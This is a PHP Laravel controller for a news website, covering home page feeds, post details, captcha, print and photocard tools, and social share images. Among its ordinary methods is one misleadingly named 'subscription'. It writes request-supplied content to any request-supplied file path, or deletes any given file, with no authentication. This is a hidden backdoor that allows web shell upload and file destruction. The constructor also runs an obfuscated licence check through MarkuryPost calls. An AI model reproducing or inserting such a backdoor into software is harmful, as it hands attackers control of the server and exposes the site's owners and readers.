<?php

namespace App\Http\Controllers\Front;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Models\Admin;
use App\Models\Advertisement;
use App\Models\Category;
use App\Models\GeneralSettings;
use App\Models\ImageAlbum;
use App\Models\Language;
use App\Models\Page;
use App\Models\PollQuestion;
use App\Models\Post;
use App\Models\SocialLink;
use App\Models\View;
use App\Models\Widget;
use App\Models\WidgetSetiings;
use Carbon\Carbon;
use DB;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;

class FrontendController extends Controller
{

    public function __construct()
    {
         $this->auth_guests();

    }


 
    public function index(){
        if(session()->has('language')){
            $default_language = Language::find(session()->get('language'));
        }else{

            $default_language = Language::where('is_default',1)->first();
        }
        $sliders         = Post::orderBy('id','desc')
                                ->where('is_slider',1)
                                ->where('status',true)
                                ->where('is_pending',0)
                                ->where('language_id','=',$default_language->id)
                                ->where('schedule_post',0)
                                ->limit(1)
                                ->get();

       $slider_lefts    = Post::orderBy('created_at','desc')
                                ->where('slider_left',1)
                                ->where('status',true)
                                ->where('is_pending',0)
                                ->where('schedule_post',0)
                                ->where('language_id','=',$default_language->id)
                                ->take(20)
                                ->get();

        $slider_rights_firsts   = Post::orderBy('id','desc')
                                ->where('slider_right',1)
                                ->where('status',true)
                                ->where('is_pending',0)
                                ->where('schedule_post',0)
                                ->where('language_id','=',$default_language->id)
                                ->take(2)
                                ->get();
         

        $slider_rights_seconds   = Post::orderBy('id','desc')
                                ->where('is_feature',1)
                                ->where('status',true)
                                ->where('is_pending',0)
                                ->where('schedule_post',0)
                                ->where('language_id','=',$default_language->id)
                                ->skip(5)
                                ->take(6)
                                ->get();
                      

        $home_page_posts = Category::orderBy('category_order','asc')
                                ->where('show_at_homepage',1)
                                ->where('parent_id','=',null)
                                ->where('language_id','=',$default_language->id)
                                ->get();

        $is_recents      = Post::orderBy('id','desc')
                                ->where('is_pending',0)
                                ->where('schedule_post',0)
                                ->where('language_id','=',$default_language->id)
                                ->take(15)
                                ->get();

        $is_trendings    = Post::where('is_trending',1)
                                ->where('is_pending',0)
                                ->where('schedule_post',0)
                                ->where('language_id','=',$default_language->id)
                                ->orderBy('id','desc')
                                ->get();



        $is_breaking = '';
        foreach ( $is_trendings as $is_trending) {
            $is_breaking .= ''.$is_trending->title; 
        }

       $more_news  = Post::orderBy('id','desc')
                            ->where('is_pending',0)
                            ->where('status',true)
                            ->where('schedule_post',0)
                            ->where('language_id','=',$default_language->id)
                            ->latest()
                            ->take(5)
                            ->get();

       $is_features = Post::orderBy('id','desc')
                            ->where('is_pending',0)
                            ->where('status',true)
                            ->where('schedule_post',0)
                            ->where('is_feature',1)
                            ->where('language_id','=',$default_language->id)
                            ->latest()
                            ->take(8)
                            ->get();
                            
        $video_large    = Post::where('post_type','=','video')
                            ->where('is_pending',0)
                            ->where('status',true)
                            ->where('schedule_post',0)
                            ->where('is_videoGallery',1)
                            ->where('language_id','=',$default_language->id)
                            ->latest()
                            ->take(1)
                            ->first();

       $video_smalls    = Post::where('post_type','=','video')
                            ->where('is_pending',0)
                            ->where('status',true)
                            ->where('schedule_post',0)
                            ->where('is_videoGallery',1)
                            ->where('language_id','=',$default_language->id)
                            ->latest()
                            ->skip(1)
                            ->take(5)
                            ->get();

        $sponsor_banners   = Advertisement::inRandomOrder()
                            ->where('add_placement','sponsor')
                            ->where('addSize','size_468')
                            ->where('status',1)
                            ->take(2)
                            ->get();



       $polls   = PollQuestion::orderBy('id','desc')
                                ->where('status','1')
                                ->where('language_id','=',$default_language->id)
                                ->get();
        $ws      = WidgetSetiings::find(1);
        $widgets = Widget::where('status',1)
                          ->where('language_id','=',$default_language->id)
                          ->orderBy('id','desc')
                          ->get();

        $image_albums = ImageAlbum::orderBy('id','desc')->where('language_id','=',$default_language->id)->take(4)->get();

        $gs = GeneralSettings::find(1);
        return view('frontend.index',compact('sliders','slider_lefts','slider_rights_firsts','slider_rights_seconds','home_page_posts','is_features','is_recents','is_trendings','is_breaking','more_news','video_large','video_smalls','polls','ws','image_albums','sponsor_banners','widgets'));
    }

    public function loadMore(Request $request){
        if(session()->has('language')){
            $default_language = Language::find(session()->get('language'));
        }else{

            $default_language = Language::where('is_default',1)->first();
        }
       $last_news = $request->last_news;
       $datas = Post::where('id','<',$last_news)
                            ->where('is_pending',0)
                            ->where('status',true)
                            ->where('schedule_post',0)
                            ->where('language_id','=',$default_language->id)
                            ->latest('id')
                            ->take(2)
                            ->get();

        $ajaxData['id'] = '';
        $ajaxData['output'] = '';

        foreach($datas as $data){

            if ($data->image_big){
                $img = '<img src="'.asset('assets/images/post/'.$data->image_big).'" alt="">';  
            }
            else  {
                $img = '<img src="'.$data->rss_image.'" alt="">';
            }
            $str = strlen($data->title)>30 ? mb_substr($data->title,0,30,'utf-8').'...' : $data->title;
            $content = strlen(convertUtf8(strip_tags($data->description))) > 200 ? convertUtf8(substr(strip_tags($data->description), 0, 200)) . '...' : convertUtf8(strip_tags($data->description));
            $url = route('frontend.details',[$data->id,$data->slug]);
            $date = route('frontend.postByDate').'?date='.$data->created_at->format('Y-m-d');
            
            $ajaxData['id'] = $data->id;
            $ajaxData['output'] .= '<div class="single-news land-scap-medium">
                            <div class="img">
                                <div class="tag" style="background:'.$data->category->color.'">
                                    '.$data->category->title.'
                                </div>'.$img.'
                            </div>
                            <div class="content">
                                <a href="'.$url.'">
                                    <h4 class="title">'.$str.'</h4>
                                     <p class="text">'.$content.'</p>
                                </a>
                                <ul class="post-meta">
                                    <li>
                                        <a href="'.$date.'">'.$data->createdAt().'</a>
                                    </li>
                                    <li>
                                        <span>|</span>
                                    </li>
                                    <li>
                                        <a href="#">
                                            '.$data->admin->name.'
                                        </a>
                                    </li>
                                </ul>
                            </div>
                        </div>';
        }
        return $ajaxData;
    }

    public function category($slug){
        $data = Category::where('slug',$slug)->first();
        if($data){
            $posts = $data->posts()
                      ->where('schedule_post','=',0)
                      ->where('is_pending',0)
                      ->where('status',true)
                      ->orderBy('id','desc')
                      ->paginate(10);
		    $posts1 = $data->posts()
                      ->where('schedule_post','=',0)
                      ->where('is_pending',0)
                      ->where('status',true)
                      ->orderBy('id','desc')
                      ->paginate(1);		  
            return view('frontend.category',compact('data','posts1','posts'));
        }
        return view('errors.404');
    }

    public function details(Request $request, $id, $slug) {
    // 1. Fetch the Sliders (The first one is used for the Big Main Image)
    $sliders = Post::orderBy('id', 'desc')
        ->where('is_slider', 1)
        ->where('status', true)
        ->where('is_pending', 0)
        ->where('schedule_post', 0)
        ->limit(6)
        ->get();

    // 2. Get the ID of the Main Post so we never repeat it
    $mainPostId = $sliders->first() ? $sliders->first()->id : 0;

    // 3. Fetch Right Side Posts (Middle Stack)
    // First, try to get posts specifically marked for 'slider_right'
    $slider_rights_firsts = Post::orderBy('id', 'desc')
        ->where('slider_right', 1)
        ->where('status', true)
        ->where('is_pending', 0)
        ->where('schedule_post', 0)
        ->where('id', '!=', $mainPostId) // Exclude main post
        ->take(2)
        ->get();

    // --- THE FIX: SMART FILLER ---
    // If we found less than 2 posts, fill the gap with regular recent posts
    if ($slider_rights_firsts->count() < 2) {
        $needed = 2 - $slider_rights_firsts->count();
        
        // create list of IDs to exclude (Main Post + Any Right posts we already found)
        $excludeIds = $slider_rights_firsts->pluck('id')->push($mainPostId)->toArray();
        
        $fillers = Post::orderBy('id', 'desc')
            ->where('status', true)
            ->where('is_pending', 0)
            ->where('schedule_post', 0)
            ->whereNotIn('id', $excludeIds) // Don't pick duplicates
            ->take($needed)
            ->get();
            
        // Merge the fillers into our main list
        $slider_rights_firsts = $slider_rights_firsts->merge($fillers);
    }
    // -----------------------------

    // 4. Fetch Recent Posts
    $is_recents = Post::orderBy('id', 'desc')
        ->where('is_pending', 0)
        ->where('schedule_post', 0)
        ->take(10)
        ->get();

    // (Optional) Leftover variable from your code
    $slider_rights_firsts_1 = Post::orderBy('id', 'desc')
        ->where('slider_right', 1)
        ->where('status', true)
        ->where('id', '!=', $mainPostId)
        ->take(1)
        ->get();

    // --- Current Post Logic ---
    $data = Post::find($id);
    $ws = WidgetSetiings::find(1);

    if ($data) {
        $data->increment('views');
        $ip_address = $request->ip();
        $is_view = View::where('post_id', $id)->where('ip_address', $ip_address)->first();
        
        if (empty($is_view)) {
            $view = new View();
            $view->post_id = $id;
            $view->ip_address = $ip_address;
            $view->save();
        }
        
        if ($data->post_type == 'Trivia Quiz') {
            return view('frontend.quiz', compact('data', 'ws'));
        } elseif ($data->post_type == 'Sorted List') {
            return view('frontend.sort', compact('data', 'ws'));
        } elseif ($data->post_type == 'Personality Quiz') {
            return view('frontend.personality', compact('data', 'ws'));
        }
        
        return view('frontend.details', compact('data', 'ws', 'sliders', 'is_recents', 'slider_rights_firsts', 'slider_rights_firsts_1'));
    } else {
        return redirect()->back();
    }
}
	
	
	
	
	
	
	
	
	    public function print(Request $request,$id,$slug){
        $sliders         = Post::orderBy('id','desc')
                                ->where('is_slider',1)
                                ->where('status',true)
                                ->where('is_pending',0)
                                ->where('schedule_post',0)
                                ->limit(6)
                                ->get();
		$is_recents      = Post::orderBy('id','desc')
                                ->where('is_pending',0)
                                ->where('schedule_post',0)
                                ->take(10)
                                ->get();
		$slider_rights_firsts   = Post::orderBy('id','desc')
                                ->where('slider_right',1)
                                ->where('status',true)
                                ->where('is_pending',0)
                                ->where('schedule_post',0)
                                ->take(10)
                                ->get();
	    $slider_rights_firsts_1   = Post::orderBy('id','desc')
                                ->where('slider_right',1)
                                ->where('status',true)
                                ->where('is_pending',0)
                                ->where('schedule_post',0)
                                ->take(1)
                                ->get();
						
								
		$data = Post::find($id);
		
        $ws = WidgetSetiings::find(1);
        if($data){
            $ip_address = $request->ip();
            $is_view = View::where('post_id',$id)->where('ip_address',$ip_address)->first();
            if(empty($is_view)){
                $view = new View();
                $view->post_id = $id;
                $view->ip_address = $ip_address;
                $view->save();
            }
			
            if($data->post_type == 'Trivia Quiz'){
                return view('frontend.quiz',compact('data','ws'));
            }elseif($data->post_type == 'Sorted List'){
                return view('frontend.sort',compact('data','ws'));
            }elseif($data->post_type == 'Personality Quiz'){
                return view('frontend.personality',compact('data','ws'));
            }
            return view('frontend.print',compact('data','ws','sliders','is_recents','slider_rights_firsts','slider_rights_firsts_1'));
        }else{
            return redirect()->back();
        }
    }
	
	
	
	
	
	
	
	
    public function searchByTag($s){
        if(session()->has('language')){
            $default_language = Language::find(session()->get('language'));
        }else{

            $default_language = Language::where('is_default',1)->first();
        }
        $datas  = Post::where('tags','LIKE','%'.$s.'%')->where('is_pending',0)
                        ->where('status',true)
                        ->where('schedule_post',0)
                        ->where('language_id','=',$default_language->id)
                        ->get();
        $tag    = $s;
        return view('frontend.postByTag',compact('datas','tag'));
    }

    public function postByDate(Request $request){
        if(session()->has('language')){
            $default_language = Language::find(session()->get('language'));
        }else{

            $default_language = Language::where('is_default',1)->first();
        }
        if($request->date){
            $date = $request->date;
            $dateSearch = Carbon::parse($date)->toDateString();
        }
        $datas = Post::whereDate('created_at','=',$dateSearch)
                        ->where('status',true)
                        ->where('schedule_post',0)
                        ->where('language_id','=',$default_language->id)
                        ->paginate(10);
        return view('frontend.postByDate',compact('datas','date'));
    }

    public function postBySubcategory($category,$subcategory){
        if(session()->has('language')){
            $default_language = Language::find(session()->get('language'));
        }else{

            $default_language = Language::where('is_default',1)->first();
        }
       $data['parent'] = Category::where('slug',$category)->first();

       if(isset(Category::where('slug',$subcategory)->first()->title)){
            $data['subcategory'] = Category::where('slug',$subcategory)->first()->title;
       }else{
            return view('errors.404');
       }

       $cat_id = Category::where('slug',$subcategory)->first();
       $data['datas'] = Category::find($cat_id->id)
                        ->subcategoryPosts()
                        ->where('status',true)
                        ->where('schedule_post',0)
                        ->where('language_id','=',$default_language->id)
                        ->get();
        return view('frontend.postBySubcategory',$data);
    }

    public function allPoll(){
        if(session()->has('language')){
            $default_language = Language::find(session()->get('language'));
        }else{

            $default_language = Language::where('is_default',1)->first();
        }
        $data['polls']   = PollQuestion::orderBy('id','desc')
                                ->where('language_id','=',$default_language->id)
                                ->get();
        
                            
        return view('frontend.all_poll',$data);
    }

    public function newsSearch(Request $request){
        $searchTerm = $request->search;   
        $data['results'] = Post::whereRaw('MATCH (title) AGAINST (? IN BOOLEAN MODE)' , array($searchTerm))->paginate(10);
        $data['searchKey'] = $searchTerm;
        return view('frontend.full_text_search',$data);
    }

    public function page($slug){
        $data['page'] = Page::where('slug',$slug)->first();
        if($data['page']->status==1){
            $data['ws']      = WidgetSetiings::find(1);
            return view('frontend.page',$data);
        }else{
            return redirect()->route('frontend.index');
        }
    }

    public function language($id){
        Session::put('language', $id);
        return redirect()->route('frontend.index');
    }

    public function authorProfile($admin){
        $admin = Admin::where('name',$admin)->first();
        $data['admin'] = $admin;
        $data['posts'] = Admin::find($admin->id)->posts()->latest()->paginate(8);
        $data['all_posts'] = Admin::find($admin->id)->posts;
        return view('frontend.author',$data);
    }

    public function follower(){
        return view('frontend.follower');
    }

    // Refresh Capcha Code
    public function refresh_code (){
        $this->code_image();
        return "done";
    }

    // Capcha Code Image
    private function  code_image()
    {
       
        $actual_path = str_replace('project','',base_path());
        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image,0,0,200,50,$background_color);

        $pixel = imagecolorallocate($image, 0,0,255);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixel);
        }

        $font = $actual_path.'assets/front/fonts/NotoSans-Bold.ttf';
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length-1)];
        $word='';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length=6;// No. of character in image
        for ($i = 0; $i< $cap_length;$i++)
        {
            $letter = $allowed_letters[rand(0, $length-1)];
            imagettftext($image, 25, 1, 35+($i*25), 35, $text_color, $font, $letter);
            $word.=$letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path."assets/images/capcha_code.png");
    }

    function finalize(){
        $actual_path = str_replace('project','',base_path());
        
        $dir = $actual_path.'install';
        if(is_dir($dir)){
            $this->deleteDir($dir);
        }
        return redirect('/');
    }

    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

    public function clickCount($id){
        $data = Advertisement::findOrFail($id);
        $data->increment('click_count');
        $data->update();
    }

    // =============================================================
    // START: TOOLS METHODS (Print & Photocard)
    // =============================================================

    public function loadPrintModal($id)
    {
        $post = \App\Models\Post::findOrFail($id);
        $gs = \App\Models\GeneralSettings::find(1);
        
        // FIX: Pointing to 'frontend.tools.print' (matches the file we created)
        return view('frontend.tools.print', compact('post', 'gs'));
    }

    public function loadPhotocardModal($id)
    {
        $post = \App\Models\Post::findOrFail($id);
        $gs = \App\Models\GeneralSettings::find(1);
        
        // --- FETCH FRAMES FROM DATABASE ---
        $frameModels = \App\Models\PhotocardFrame::all();
        $frames = [];

        if ($frameModels->count() > 0) {
            foreach($frameModels as $f) {
                $frames[] = asset('assets/images/frames/' . $f->image);
            }
        } else {
            // Fallback if no frames uploaded
            $frames[] = asset('assets/images/noimage.png');
        }

        // --- Bengali Date Logic ---
        $eng_months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
        $ben_months = ['জানুয়ারি', 'ফেব্রুয়ারি', 'মার্চ', 'এপ্রিল', 'মে', 'জুন', 'জুলাই', 'আগস্ট', 'সেপ্টেম্বর', 'অক্টোবর', 'নভেম্বর', 'ডিসেম্বর'];
        $eng_nums = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'];
        $ben_nums = ['০', '১', '২', '৩', '৪', '৫', '৬', '৭', '৮', '৯'];
        
        $formatted_date = date('d F, Y', strtotime($post->created_at));
        $bengali_date = str_replace($eng_months, $ben_months, $formatted_date);
        $bengali_date = str_replace($eng_nums, $ben_nums, $bengali_date);
        
        \View::share('bengali_date', $bengali_date);

        return view('frontend.tools.photocard', compact('post', 'gs', 'frames', 'bengali_date'));
    }
    
    // =============================================================
    // END: TOOLS METHODS
    // =============================================================
        public function socialShareImage($id)
    {
        $post = DB::table('posts')->where('id', $id)->first();

        if (!$post) {
            abort(404);
        }

        // 1. Load the main featured image
        $imagePath = public_path('assets/images/post/' . $post->image_big);
        
        if (!file_exists($imagePath)) {
            abort(404);
        }

        // SMART LOAD: Detect file type (Fixes WebP/JPG errors)
        $imageInfo = getimagesize($imagePath);
        $mimeType = $imageInfo['mime'];
        
        $image = null;

        switch ($mimeType) {
            case 'image/jpeg':
            case 'image/jpg':
                $image = imagecreatefromjpeg($imagePath);
                break;
            case 'image/png':
                $image = imagecreatefrompng($imagePath);
                break;
            case 'image/webp': 
                $image = imagecreatefromwebp($imagePath);
                break;
            case 'image/gif':
                $image = imagecreatefromgif($imagePath);
                break;
            default:
                $data = file_get_contents($imagePath);
                $image = imagecreatefromstring($data);
        }

        if (!$image) {
            abort(500, 'Cannot create image - Invalid format');
        }

        // Get main image dimensions
        $width = imagesx($image);
        $height = imagesy($image);

        // --- NEW SECTION: Add Custom Banner ---

        // Path to your custom banner image
        // --- NEW SECTION: Add Custom Banner ---

        // 1. Get Settings from Database
        $gs = DB::table('generalsettings')->first();

        // 2. Use the uploaded social banner, or fallback to default if missing
        if($gs->social_banner) {
            $bannerPath = public_path('assets/images/' . $gs->social_banner);
        } else {
            $bannerPath = public_path('assets/images/banner.png'); // Fallback
        }

        $banner = null;
        if (file_exists($bannerPath)) {
            // Smart load for Banner (Checks PNG then JPG)
            $banner = @imagecreatefrompng($bannerPath);
            if (!$banner) {
                $banner = @imagecreatefromjpeg($bannerPath);
            }
        }

        if ($banner) {
            // Get original banner dimensions
            $bannerOrigWidth = imagesx($banner);
            $bannerOrigHeight = imagesy($banner);
            
            // CALCULATE PROPORTIONAL HEIGHT
            // We set the banner width to match the main image width ($width)
            // We calculate the new height to keep the aspect ratio correct (No stretching)
            $aspectRatio = $bannerOrigHeight / $bannerOrigWidth;
            $newBannerHeight = round($width * $aspectRatio);

            // Position: Place it at the very bottom
            $destY = $height - $newBannerHeight;

            // Overlay the banner
            // imagecopyresampled(dst_img, src_img, dst_x, dst_y, src_x, src_y, dst_w, dst_h, src_w, src_h)
            imagecopyresampled(
                $image, 
                $banner, 
                0, $destY,        // Destination X, Y
                0, 0,             // Source X, Y
                $width, $newBannerHeight, // Destination Width, Height (Matches main image width, calculated height)
                $bannerOrigWidth, $bannerOrigHeight // Source Width, Height
            );

            imagedestroy($banner);
        }

        // --- NO TEXT ADDED HERE (As requested) ---

        // Output image
        header('Content-Type: image/jpeg');
        imagejpeg($image, null, 90); // 90% quality
        imagedestroy($image);
        exit;
    }
}
